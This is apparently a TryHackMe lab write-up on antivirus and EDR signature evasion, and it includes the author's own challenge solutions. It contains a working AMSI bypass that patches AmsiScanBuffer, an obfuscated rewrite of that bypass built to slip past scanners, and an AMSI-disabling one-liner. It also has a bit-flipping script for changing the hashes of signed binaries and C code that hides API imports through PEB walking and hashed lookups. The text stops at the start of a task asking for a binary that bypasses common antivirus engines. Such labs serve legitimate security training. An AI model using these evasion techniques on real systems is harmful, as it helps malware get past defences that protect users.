
# Introduction

---

An adversary may struggle to overcome specific detections when facing an advanced anti-virus engine or **EDR** (**E**ndpoint **D**etection & **R**esponse) solution. Even after employing some of the most common obfuscation or evasion techniques discussed in [Obfuscation Principles](https://tryhackme.com/room/obfuscationprinciples), signatures in a malicious file may still be present.

![Decorative image of a toolbox](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/1e9f66d4cc4de936cf372c1e7d4ceba1.png)

To combat persistent signatures, adversaries can observe each individually and address them as needed.

In this room, we will understand what signatures are and how to find them, then attempt to break them following an agnostic thought process. To dive deeper and combat heuristic signatures, we will also discuss more advanced code concepts and “malware best practices.”

### Learning Objectives

1. Understand the origins of signatures and how to observe/detect them in malicious code
2. Implement documented obfuscation methodology to break signatures
3. Leverage non-obfuscation-based techniques to break non-function oriented signatures.

This room is a successor to [Obfuscation Principles](https://tryhackme.com/room/obfuscationprinciples); we highly recommend completing it before this room if you have not already.   

Before beginning this room, familiarize yourself with basic programming logic and syntax. Knowledge of C and PowerShell is recommended but not required.   

We have provided a base Windows machine with the files needed to complete this room. You can access the machine in-browser or through RDP using the credentials below.

Machine IP: `MACHINE_IP`             Username: `Student`             Password: `TryHackMe!`

This is going to be a lot of information. Please locate your nearest hammer and fire extinguisher.



# Signature Identification

---

Before jumping into breaking signatures, we need to understand and identify what we are looking for. As covered in [Introduction to Anti-Virus](https://tryhackme.com/room/introtoav), signatures are used by anti-virus engines to track and identify possible suspicious and/or malicious programs. In this task, we will observe how we can manually identify an exact byte where a signature starts.

When identifying signatures, whether manually or automated, we must employ an iterative process to determine what byte a signature starts at. By recursively splitting a compiled binary in half and testing it, we can get a rough estimate of a byte-range to investigate further.

We can use the native utilities `head`, `dd`, or `split` to split a compiled binary. In the below command prompt, we will walk through using head to find the first signature present in a msfvenom binary.

Once split, move the binary from your development environment to a machine with the anti-virus engine you would like to test on. If an alert appears, move to the lower half of the split binary and split it again. If an alert does not appear, move to the upper half of the split binary and split it again. Continue this pattern until you cannot determine where to go; this will typically occur around the kilobyte range.

Once you have reached the point at which you no longer accurately split the binary, you can use a hex editor to view the end of the binary where the signature is present.

```hex
0000C2E0  43 68 6E E9 0A 00 00 00 0C 4D 1A 8E 04 3A E9 89  Chné.....M.Ž.:é‰

0000C2F0  67 6F BE 46 01 00 00 6A 40 90 68 00 10 00 00 E9  go¾F...j@.h....é

0000C300  0A 00 00 00 53 DF A1 7F 64 ED 40 73 4A 64 56 90  ....Sß¡.dí@sJdV.

0000C310  6A 00 68 58 A4 53 E5 E9 08 00 00 00 15 0D 69 B6  j.hX¤Såé......i¶

0000C320  F4 AB 1B 73 FF D5 E9 0A 00 00 00 7D 43 00 40 DB  ô«.sÿÕé....}C.@Û

0000C330  43 8B AC 55 82 89 C3 90 E9 08 00 00 00 E4 95 8E  C‹¬U‚‰Ã.é....ä•Ž

0000C340  2C 06 AC 29 A3 89 C7 90 E9 0B 00 00 00 0B 32 AC  ,.¬)£‰Ç.é.....2¬
```

We have the location of a signature; how human-readable it is will be determined by the tool itself and the compilation method.

Now… no one wants to spend hours going back and forth trying to track down bad bytes; let’s automate it! In the next task, we will look at a few **FOSS** (**F**ree and **O**pen-**S**ource **S**oftware) solutions to aid us in identifying signatures in compiled code.

# Automating Signature Identification

---

The process shown in the previous task can be quite arduous. To speed it up, we can automate it using scripts to split bytes over an interval for us. [Find-AVSignature](https://github.com/PowerShellMafia/PowerSploit/blob/master/AntivirusBypass/Find-AVSignature.ps1) will split a provided range of bytes through a given interval.

Find-AVSignature

```powershell
PS C:\> . .\FInd-AVSignature.ps1
PS C:\> Find-AVSignature

cmdlet Find-AVSignature at command pipeline position 1
Supply values for the following parameters:
StartByte: 0
EndByte: max
Interval: 1000

Do you want to continue?
This script will result in 1 binaries being written to "C:\Users\TryHackMe"!
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): y
```

This script relieves a lot of the manual work, but still has several limitations. Although it requires less interaction than the previous task, it still requires an appropriate interval to be set to function properly. This script will also only observe strings of the binary when dropped to disk rather than scanning using the full functionality of the anti-virus engine.

To solve this problem we can use other **FOSS** (**F**ree and **O**pen-**S**ource **S**oftware) tools that leverage the engines themselves to scan the file, including [DefenderCheck](https://github.com/matterpreter/DefenderCheck), [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck), and [AMSITrigger](https://github.com/RythmStick/AMSITrigger). In this task, we will primarily focus on ThreatCheck and briefly mention the uses of AMSITrigger at the end.

---

### ThreatCheck

ThreatCheck is a fork of DefenderCheck and is arguably the most widely used/reliable of the three. To identify possible signatures, ThreatCheck leverages several anti-virus engines against split compiled binaries and reports where it believes bad bytes are present.

ThreatCheck does not provide a pre-compiled release to the public. For ease of use we have already compiled the tool for you; it can be found in `C:\Users\Administrator\Desktop\Tools` of the attached machine.

Below is the basic syntax usage of ThreatCheck.

ThreatCheck Help Menu

```powershell
C:\>ThreatCheck.exe --help
  -e, --engine    (Default: Defender) Scanning engine. Options: Defender, AMSI
  -f, --file      Analyze a file on disk
  -u, --url       Analyze a file from a URL
  --help          Display this help screen.
  --version       Display version information.
```

For our uses we only need to supply a file and optionally an engine; however, we will primarily want to use AMSITrigger when dealing with **AMSI** (**A**nti-**M**alware **S**can **I**nterface), as we will discuss later in this task.

ThreatCheck

```powershell
C:\>ThreatCheck.exe -f Downloads\Grunt.bin -e AMSI
	[+] Target file size: 31744 bytes
	[+] Analyzing...
	[!] Identified end of bad bytes at offset 0x6D7A
	00000000   65 00 22 00 3A 00 22 00  7B 00 32 00 7D 00 22 00   e·"·:·"·{·2·}·"·
	00000010   2C 00 22 00 74 00 6F 00  6B 00 65 00 6E 00 22 00   ,·"·t·o·k·e·n·"·
	00000020   3A 00 7B 00 33 00 7D 00  7D 00 7D 00 00 43 7B 00   :·{·3·}·}·}··C{·
	00000030   7B 00 22 00 73 00 74 00  61 00 74 00 75 00 73 00   {·"·s·t·a·t·u·s·
	00000040   22 00 3A 00 22 00 7B 00  30 00 7D 00 22 00 2C 00   "·:·"·{·0·}·"·,·
	00000050   22 00 6F 00 75 00 74 00  70 00 75 00 74 00 22 00   "·o·u·t·p·u·t·"·
	00000060   3A 00 22 00 7B 00 31 00  7D 00 22 00 7D 00 7D 00   :·"·{·1·}·"·}·}·
	00000070   00 80 B3 7B 00 7B 00 22  00 47 00 55 00 49 00 44   ·?³{·{·"·G·U·I·D
	00000080   00 22 00 3A 00 22 00 7B  00 30 00 7D 00 22 00 2C   ·"·:·"·{·0·}·"·,
	00000090   00 22 00 54 00 79 00 70  00 65 00 22 00 3A 00 7B   ·"·T·y·p·e·"·:·{
	000000A0   00 31 00 7D 00 2C 00 22  00 4D 00 65 00 74 00 61   ·1·}·,·"·M·e·t·a
	000000B0   00 22 00 3A 00 22 00 7B  00 32 00 7D 00 22 00 2C   ·"·:·"·{·2·}·"·,
	000000C0   00 22 00 49 00 56 00 22  00 3A 00 22 00 7B 00 33   ·"·I·V·"·:·"·{·3
	000000D0   00 7D 00 22 00 2C 00 22  00 45 00 6E 00 63 00 72   ·}·"·,·"·E·n·c·r
	000000E0   00 79 00 70 00 74 00 65  00 64 00 4D 00 65 00 73   ·y·p·t·e·d·M·e·s
	000000F0   00 73 00 61 00 67 00 65  00 22 00 3A 00 22 00 7B   ·s·a·g·e·"·:·"·{
```

It’s that simple! No other configuration or syntax is required and we can get straight to modifying our tooling. To efficiently use this tool we can identify any bad bytes that are first discovered then recursively break them and run the tool again until no signatures are identified.

Note: There may be instances of false positives, in which the tool will report no bad bytes. This will require your own intuition to observe and solve; however, we will discuss this further in task 4.

---

### AMSITrigger

As covered in [Runtime Detection Evasion](https://tryhackme.com/room/runtimedetectionevasion), AMSI leverages the runtime, making signatures harder to identify and resolve. ThreatCheck also does not support certain file types such as PowerShell that AMSITrigger does.

AMSITrigger will leverage the AMSI engine and scan functions against a provided PowerShell script and report any specific sections of code it believes need to be alerted on.

AMSITrigger does provide a pre-compiled release on their GitHub and can also be found on the Desktop of the attached machine.

Below is the syntax usage of AMSITrigger

AMSITrigger Help Menu

```powershell
C:\>amsitrigger.exe --help
	-i, --inputfile=VALUE       Powershell filename
	-u, --url=VALUE             URL eg. <https://10.1.1.1/Invoke-NinjaCopy.ps1>
	-f, --format=VALUE          Output Format:
	                              1 - Only show Triggers
	                              2 - Show Triggers with Line numbers
	                              3 - Show Triggers inline with code
	                              4 - Show AMSI calls (xmas tree mode)
	-d, --debug                 Show Debug Info
	-m, --maxsiglength=VALUE    Maximum signature Length to cater for,
	                              default=2048
	-c, --chunksize=VALUE       Chunk size to send to AMSIScanBuffer,
	                              default=4096
	-h, -?, --help              Show Help
```

For our uses we only need to supply a file and the preferred format to report signatures.

AMSITrigger Example

```powershell
PS C:\> .\amsitrigger.exe -i bypass.ps1 -f 3
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

In the next task we will discuss how you can use the information gathered from these tools to break signatures.

# Static Code-Based Signatures

---

Once we have identified a troublesome signature we need to decide how we want to deal with it. Depending on the strength and type of signature, it may be broken using simple obfuscation as covered in [Obfuscation Principles](https://tryhackme.com/room/obfuscationprinciples), or it may require specific investigation and remedy. In this task, we aim to provide several solutions to remedy static signatures present in functions.

The [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf) covers the most reliable solutions as part of the **Obfuscating Methods** and **Obfuscating Classes** layer.

Obfuscating methods

|   |   |
|---|---|
|**Obfuscation Method  <br>**|**Purpose**|
|Method Proxy|Creates a proxy method or a replacement object|
|Method Scattering/Aggregation|Combine multiple methods into one or scatter a method into several|
|Method Clone|Create replicas of a method and randomly call each|

Obfuscating Classes

|   |   |
|---|---|
|**Obfuscation Method  <br>**|**Purpose**|
|Class Hierarchy Flattening|Create proxies for classes using interfaces|
|Class Splitting/Coalescing|Transfer local variables or instruction groups to another class|
|Dropping Modifiers|Remove class modifiers (public, private) and make all members public|

Looking at the above tables, even though they may use specific technical terms or ideas, we can group them into a core set of agnostic methods applicable to any object or data structure.

The techniques **class splitting/coalescing** and **method scattering/aggregation** can be grouped into an overarching concept of splitting or merging any given **OOP** (**O**bject-**O**riented **P**rogramming) function.

Other techniques such as **dropping modifiers** or **method clone** can be grouped into an overarching concept of removing or obscuring identifiable information.

---

### Splitting and Merging Objects

The methodology required to split or merge objects is very similar to the objective of concatenation as covered in [Obfuscation Principles.](https://tryhackme.com/room/signatureevasion)

The premise behind this concept is relatively easy, we are looking to create a new object function that can break the signature while maintaining the previous functionality.

To provide a more concrete example of this, we can use the [well-known case study](https://offensivedefence.co.uk/posts/covenant-profiles-templates/) in Covenant present in the `GetMessageFormat` string. We will first look at how the solution was implemented then break it down and apply it to the obfuscation taxonomy.

**Original String**

Below is the original string that is detected

```csharp
string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2},""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
```

**Obfuscated Method**

Below is the new class used to replace and concatenate the string.

```csharp
public static string GetMessageFormat // Format the public method
{
    get // Return the property value
    {
        var sb = new StringBuilder(@"{{""GUID"":""{0}"","); // Start the built-in concatenation method
        sb.Append(@"""Type"":{1},"); // Append substrings onto the string
        sb.Append(@"""Meta"":""{2}"",");
        sb.Append(@"""IV"":""{3}"",");
        sb.Append(@"""EncryptedMessage"":""{4}"",");
        sb.Append(@"""HMAC"":""{5}""}}");
        return sb.ToString(); // Return the concatenated string to the class
    }
}

string MessageFormat = GetMessageFormat
```

Recapping this case study, class splitting is used to create a new class for the local variable to concatenate. We will cover how to recognize when to use a specific method later in this task and throughout the practical challenge.

---

### Removing and Obscuring Identifiable Information

The core concept behind removing identifiable information is similar to obscuring variable names as covered in [Obfuscation Principles](https://tryhackme.com/room/signatureevasion). In this task, we are taking it one step further by specifically applying it to identified signatures in any objects including methods and classes.

An example of this can be found in Mimikatz where an alert is generated for the string `wdigest.dll`. This can be solved by replacing the string with any random identifier changed throughout all instances of the string. This can be categorized in the obfuscation taxonomy under the method proxy technique.

This is almost no different than as discussed in [Obfuscation Principles](https://tryhackme.com/room/signatureevasion); however, it is applied to a specific situation.

---

Using the knowledge you have accrued throughout this task, obfuscate the following PowerShell snippet, using AmsiTrigger to visual signatures.

```powershell
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$A = "AmsiScanBuffer"
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $A);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 

[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```

Once sufficiently obfuscated, submit the snippet to the webserver at `http://10.10.41.61/challenge-1.html`. The file name must be saved as `challenge-1.ps1`. If correctly obfuscated a flag will appear in an alert pop-up.

### Practical
---

Let's submit this file:

```powershell
# === scatter & assemble the DllImport definition ===
$k = 'ker' + 'nel' + '32'
$parts = @(
    "[DllImport(`"$k`")]",
    'public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);',
    "[DllImport(`"$k`")]",
    'public static extern IntPtr GetModuleHandle(string lpModuleName);',
    "[DllImport(`"$k`")]",
    'public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);'
)
$sb = [System.Text.StringBuilder]::new()
$parts | ForEach-Object { $sb.AppendLine($_) | Out-Null }
$MethodDef = $sb.ToString()

# === dynamically add the type with a random name ===
$ns = 'W' + 'in' + '32'
$typeName = 'K' + ([Guid]::NewGuid().ToString('N').Substring(0,8))
$K = Add-Type -MemberDefinition $MethodDef `
              -Name $typeName -Namespace $ns -PassThru

# === split up our targets so static scanners choke ===
$modName = 'a' + 'ms' + 'i' + '.' + 'dll'
$funcName = ('A','m','s','i','S','c','a','n','B','u','f','f','e','r') -join ''

# === resolve pointers ===
$hMod   = [${ns}.$typeName]::GetModuleHandle($modName)
$addr   = [IntPtr]([${ns}.$typeName]::GetProcAddress($hMod, $funcName))

# === prepare our patch bytes ===
$bytes = 0xB8,0x57,0x00,0x07,0x80,0xC3

# === flip memory perms and write the patch ===
$dsize     = 0x5
$newProt   = 0x40
$oldProt   = 0
# call VirtualProtect indirectly
$vp = [${ns}.$typeName].GetMethod('VirtualProtect')
$vp.Invoke($null, @($addr, [UIntPtr]$dsize, $newProt, [ref]$oldProt)) | Out-Null

# finally marshal the bytes over
[System.Runtime.InteropServices.Marshal]::Copy([byte[]]$bytes, 0, $addr, $bytes.Count)
```

Let's save that file as `challenge-1.ps1` and submit it:

![[Pasted image 20250521154519.png]]

We got our flag:

```
THM{70_D373C7_0r_70_N07_D373C7}
```


# Static Property-Based Signatures

---

Various detection engines or analysts may consider different indicators rather than strings or static signatures to contribute to their hypothesis. Signatures can be attached to several file properties, including file hash, entropy, author, name, or other identifiable information to be used individually or in conjunction. These properties are often used in rule sets such as **YARA** or **Sigma**.

Some properties may be easily manipulated, while others can be more difficult, specifically when dealing with pre-compiled closed-source applications.

This task will discuss manipulating the **file hash** and **entropy** of both open-source and closed-source applications.

Note: several other properties such as PE headers or module properties can be used as indicators. Because these properties often require an agent or other measures to detect, we will not cover them in this room to keep the focus on signatures.

---

### File Hashes

A **file hash**, also known as a **checksum**, is used to tag/identify a unique file. They are commonly used to verify a file’s authenticity or its known purpose (malicious or not). File hashes are generally arbitrary to modify and are changed due to any modification to the file.

If we have access to the source for an application, we can modify any arbitrary section of the code and re-compile it to create a new hash. That solution is straightforward, but what if we need a pre-compiled or signed application?

When dealing with a signed or closed-source application, we must employ **bit-flipping**.

Bit-flipping is a common cryptographic attack that will mutate a given application by flipping and testing each possible bit until it finds a viable bit. By flipping one viable bit, it will change the signature and hash of the application while maintaining all functionality.

We can use a script to create a **bit-flipped list** by flipping each bit and creating a new **mutated variant** (~3000 - 200000 variants). Below is an example of a python bit-flipping implementation.

```python
import sys

orig = list(open(sys.argv[1], "rb").read())

i = 0
while i < len(orig):
	current = list(orig)
	current[i] = chr(ord(current[i]) ^ 0xde)
	path = "%d.exe" % i
	
	output = "".join(str(e) for e in current)
	open(path, "wb").write(output)
	i += 1
	
print("done")
```

Once the list is created, we must search for intact unique properties of the file. For example, if we are bit-flipping `msbuild`, we need to use `signtool` to search for a file with a useable certificate. This will guarantee that the functionality of the file is not broken, and the application will maintain its signed attribution.

We can leverage a script to loop through the bit-flipped list and verify functional variants. Below is an example of a batch script implementation.

```powershell
FOR /L %%A IN (1,1,10000) DO (
	signtool verify /v /a flipped\\%%A.exe
)
```

This technique can be very lucrative, although it can take a long time and will only have a limited period until the hash is discovered. Below is a comparison of the original MSBuild application and the bit-flipped variation.

![Image of WinMD5Free showing the hash of Original.exe](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/ab3f859f9dc34e6c4b41fe3437b2396d.png)


![down arrow](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3adf6b9caad98324a399a2a00775e37c.png)

![Image of WinMD5Free showing the hash of Variant.exe](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3e4c0050212e7c69d408135de36976a3.png)



---

### Entropy

From [IBM](https://www.ibm.com/docs/en/qsip/7.4?topic=content-analyzing-files-embedded-malicious-activity), Entropy is defined as “the randomness of the data in a file used to determine whether a file contains hidden data or suspicious scripts.” EDRs and other scanners often leverage entropy to identify potential suspicious files or contribute to an overall malicious score.

Entropy can be problematic for obfuscated scripts, specifically when obscuring identifiable information such as variables or functions.

To lower entropy, we can replace random identifiers with randomly selected English words. For example, we may change a variable from `q234uf` to `nature`.

To prove the efficacy of changing identifiers, we can observe how the entropy changes using [CyberChef](https://gchq.github.io/CyberChef/#recipe=Entropy\('Shannon%20scale'\)).

Below is the Shannon entropy scale for a standard English paragraph.

**Shannon entropy: 4.587362034903882**

![Status bar showing the entropy of an english paragraph](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/96630d6dbe47ad3204cc121e9b5bf84e.png)

Below is the Shannon entropy scale for a small script with random identifiers.

**Shannon entropy: 5.341436973971389**

![Status bar showing the entropy of a small script with randomization](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/92db2f5431d34098678bbcbf8170af52.png)

Depending on the EDR employed, a “suspicious” entropy value is ~ greater than 6.8.

The difference between a random value and English text will become amplified with a larger file and more occurrences.

Note that entropy will generally never be used alone and only to support a hypothesis. For example, the entropy for the command `pskill` and the hivenightmare exploit are almost identical.

To see entropy in action, let’s look at how an EDR would use it to contribute to threat indicators.

In the white paper, [An Empirical Assessment of Endpoint Detection and Response Systems against Advanced Persistent Threats Attack Vectors](https://www.mdpi.com/2624-800X/1/3/21/pdf)_,_ **SentinelOne** _is shown to detect a DLL due to high entropy, specifically through AES encryption._


### Practical
----

We need to get the file using `scp` inside of the windows machine:

```
scp shell.exe our_linux_user@VPN_IP:/home/our_linux_user
```

Once we got the file, let's open it on cyberchef:

![[Pasted image 20250521155801.png]]

As we can see, we got the aproximate:

```
6.354
```



# Behavioral Signatures

---


Obfuscating functions and properties can achieve a lot with minimal modification. Even after breaking static signatures attached to a file, modern engines may still observe the behavior and functionality of the binary. This presents numerous problems for attackers that cannot be solved with simple obfuscation.  

As covered in [Introduction to Anti-Virus](https://tryhackme.com/room/introtoav), modern anti-virus engines will employ two common methods to detect behavior: observing imports and hooking known malicious calls. While imports, as will be covered in this task, can be easily obfuscated or modified with minimal requirements, hooking requires complex techniques out of scope for this room. Because of the prevalence of API calls specifically, observing these functions can be a significant factor in determining if a file is suspicious, along with other behavioral tests/considerations.

Before diving too deep into rewriting or importing calls, let’s discuss how API calls are traditionally utilized and imported. We will cover C-based languages first and then briefly cover .NET-based languages later in this task.

API calls and other functions native to an operating system require a pointer to a function address and a structure to utilize them.

Structures for functions are simple; they are located in **import libraries** such as `kernel32` or `ntdll` that store function structures and other core information for Windows.

The most significant issue to function imports is the function addresses. Obtaining a pointer may seem straightforward, although because of **ASLR** (**A**ddress **S**pace **L**ayout **R**andomization), function addresses are dynamic and must be found.

Rather than altering code at runtime, the **Windows loader** `windows.h` is employed. At runtime, the loader will map all modules to process address space and list all functions from each. That handles the modules, but how are function addresses assigned?

One of the most critical functions of the Windows loader is the **IAT (I**mport **A**ddress **T**able). The IAT will store function addresses for all imported functions that can assign a pointer for the function.

The IAT is stored in the **PE** (**P**ortable **E**xecutable) header `IMAGE_OPTIONAL_HEADER` and is filled by the Windows loader at runtime. The Windows loader obtains the function addresses or, more precisely, **thunks** from a pointer table, accessed from an API call or **thunk table**. Check out the [Windows Internals room](https://tryhackme.com/room/windowsinternals) for more information about the PE structure.

At a glance, an API is assigned a pointer to a thunk as the function address from the Windows loader. To make this a little more tangible, we can observe an example of the PE dump for a function.

![Image of DiE showing the IAT table of a binary](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/0d4ba9ba4348b53036cb2127f4968e87.png)  

---

The import table can provide a lot of insight into the functionality of a binary that can be detrimental to an adversary. But how can we prevent our functions from appearing in the IAT if it is required to assign a function address?

As briefly mentioned, the thunk table is not the only way to obtain a pointer for a function address. We can also utilize an API call to obtain the function address from the import library itself. This technique is known as **dynamic loading** and can be used to avoid the IAT and minimize the use of the Windows loader.

We will write our structures and create new arbitrary names for functions to employ dynamic loading.

At a high level, we can break up dynamic loading in C languages into four steps,

1. Define the structure of the call
2. Obtain the handle of the module the call address is present in
3. Obtain the process address of the call
4. Use the newly created call

To begin dynamically loading an API call, we must first define a structure for the call before the main function. The call structure will define any inputs or outputs that may be required for the call to function. We can find structures for a specific call on the Microsoft documentation. For example, the structure for `GetComputerNameA` can be found [here](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea). Because we are implementing this as a new call in C, the syntax must change a little, but the structure stays the same, as seen below.

```cpp
// 1. Define the structure of the call
typedef BOOL (WINAPI* myNotGetComputerNameA)(
	LPSTR   lpBuffer,
	LPDWORD nSize
);
```

To access the address of the API call, we must first load the library where it is defined. We will define this in the main function. This is commonly `kernel32.dll` or `ntdll.dll` for any Windows API calls. Below is an example of the syntax required to load a library into a module handle.

```cpp
// 2. Obtain the handle of the module the call address is present in 
HMODULE hkernel32 = LoadLibraryA("kernel32.dll");
```

Using the previously loaded module, we can obtain the process address for the specified API call. This will come directly after the `LoadLibrary` call. We can store this call by casting it along with the previously defined structure. Below is an example of the syntax required to obtain the API call.

```c
// 3. Obtain the process address of the call
myNotGetComputerNameA notGetComputerNameA = (myNotGetComputerNameA) GetProcAddress(hkernel32, "GetComputerNameA");
```

Although this method solves many concerns and problems, there are still several considerations that must be noted. Firstly, `GetProcAddress` and `LoadLibraryA` are still present in the IAT; although not a direct indicator it can lead to or reinforce suspicion; this problem can be solved using **PIC** (**P**osition **I**ndependent **C**ode). Modern agents will also hook specific functions and monitor kernel interactions; this can be solved using **API unhooking**.

---

Using the knowledge you have accrued throughout this task, obfuscate the following C snippet, ensuring no suspicious API calls are present in the IAT.

```c
#include <windows.h>
#include <stdio.h>
#include <lm.h>

int main() {
    printf("GetComputerNameA: 0x%p\\n", GetComputerNameA);
    CHAR hostName[260];
    DWORD hostNameLength = 260;
    if (GetComputerNameA(hostName, &hostNameLength)) {
        printf("hostname: %s\\n", hostName);
    }
}
```

Once sufficiently obfuscated, submit the snippet to the webserver at `http://10.10.41.61/challenge-2.html`. The file name must be saved as `challenge-2.exe`. If correctly obfuscated a flag will appear in an alert pop-up.

## Practical
---

For this task, I went with the following script:

```c
#include <windows.h>
#include <stdio.h>

// --- minimal internal structs (prefixed MY_) ---
typedef struct _MY_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_LIST_ENTRY {
    struct _MY_LIST_ENTRY* Flink;
    struct _MY_LIST_ENTRY* Blink;
} MY_LIST_ENTRY, *PMY_LIST_ENTRY;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    MY_LIST_ENTRY    InMemoryOrderLinks;
    PVOID            DllBase;
    MY_UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

typedef struct _MY_PEB_LDR_DATA {
    BYTE           Reserved[8];
    MY_LIST_ENTRY  InMemoryOrderModuleList;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

typedef struct _MY_PEB {
    BYTE             Reserved1[0x18];
    PMY_PEB_LDR_DATA Ldr;
} MY_PEB, *PMY_PEB;


// --- simple ROTR-13 hash (case-insensitive) ---
static DWORD ror13(DWORD d) { return _rotr(d, 13); }
static DWORD hash_str(const char* s) {
    DWORD h = 0;
    for (; *s; s++) {
        char c = *s;
        if (c >= 'a' && c <= 'z') c -= 32;
        h = ror13(h) + c;
    }
    return h;
}

// --- fetch PEB via GS:[0x60] using inline asm ---
static MY_PEB* get_peb(void) {
    MY_PEB* peb;
    __asm__ __volatile__(
        "mov %%gs:0x60, %0\n"
        : "=r"(peb)
    );
    return peb;
}

// --- walk modules looking for our hash ---
static HMODULE get_module_base(DWORD target_hash) {
    PMY_PEB peb = get_peb();
    PMY_LIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    for (PMY_LIST_ENTRY e = head->Flink; e != head; e = e->Flink) {
        PMY_LDR_DATA_TABLE_ENTRY ent = CONTAINING_RECORD(
            e, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks
        );
        // convert Unicode name to ANSI on-the-fly
        WCHAR* w = ent->BaseDllName.Buffer;
        char tmp[64] = {0};
        int len = min(ent->BaseDllName.Length/2, 63);
        for (int i = 0; i < len; i++) tmp[i] = (char)w[i];
        if (hash_str(tmp) == target_hash)
            return (HMODULE)ent->DllBase;
    }
    return NULL;
}

// --- parse exports to resolve a function by name-hash ---
static FARPROC get_export(HMODULE mod, DWORD func_hash) {
    BYTE* base = (BYTE*)mod;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)
      (base + nt->OptionalHeader.DataDirectory
                      [IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* names = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ords  = (WORD* )(base + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* name = (char*)(base + names[i]);
        if (hash_str(name) == func_hash)
            return (FARPROC)(base + funcs[ords[i]]);
    }
    return NULL;
}

int main() {
    // 1) Resolve kernel32.dll base
    DWORD k32_hash = hash_str("kernel32.dll");
    HMODULE k32 = get_module_base(k32_hash);
    if (!k32) { printf("kernel32 not found\n"); return 1; }

    // 2) Resolve GetProcAddress & GetComputerNameA
    DWORD hpa = hash_str("GetProcAddress");
    DWORD hgc = hash_str("GetComputerNameA");

    FARPROC fpGPA = get_export(k32, hpa);
    if (!fpGPA) { printf("GetProcAddress not found\n"); return 1; }

    // cast to proper prototype
    typedef FARPROC (WINAPI* tGPA)(HMODULE, LPCSTR);
    tGPA MyGPA = (tGPA)fpGPA;

    tGPA pGCA = (tGPA) MyGPA(k32, "GetComputerNameA");
    if (!pGCA) { printf("GetComputerNameA not found\n"); return 1; }

    // 3) Invoke it
    CHAR buf[260]; DWORD len = 260;
    printf("GetComputerNameA @ %p\n", pGCA);
    if (((BOOL(WINAPI*)(LPSTR,LPDWORD))pGCA)(buf, &len))
        printf("Hostname: %s\n", buf);
    else
        printf("Call failed: %08x\n", GetLastError());

    return 0;
}
```

We need to compile it:

```
x86_64-w64-mingw32-gcc -O2 -static -o challenge-2.exe challenge-2.c
```

And upload it:

![[Pasted image 20250521161208.png]]

We got our flag:

```
THM{N0_1MP0r75_F0r_Y0U}
```



# Putting It All Together

---

As reiterated through both this room and [Obfuscation Principles](https://tryhackme.com/room/obfuscationprinciples), no one method will be 100% effective or reliable.

To create a more effective and reliable methodology, we can combine several of the methods covered in this room and the previous.

When determining what order you want to begin obfuscation, consider the impact of each method. For example, is it easier to obfuscate an already broken class or is it easier to break a class that is obfuscated?

Note: In general, You should run automated obfuscation or less specific obfuscation methods after specific signature breaking, however, you will not need those techniques for this challenge.

Taking these notes into consideration, modify the provided binary to meet the specifications below.

1. No suspicious library calls present
2. No leaked function or variable names
3. File hash is different than the original hash
4. Binary bypasses common anti-virus engines

Note: When considering library calls and leaked function, be conscious of the IAT table and strings of your binary.

```c
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 1024

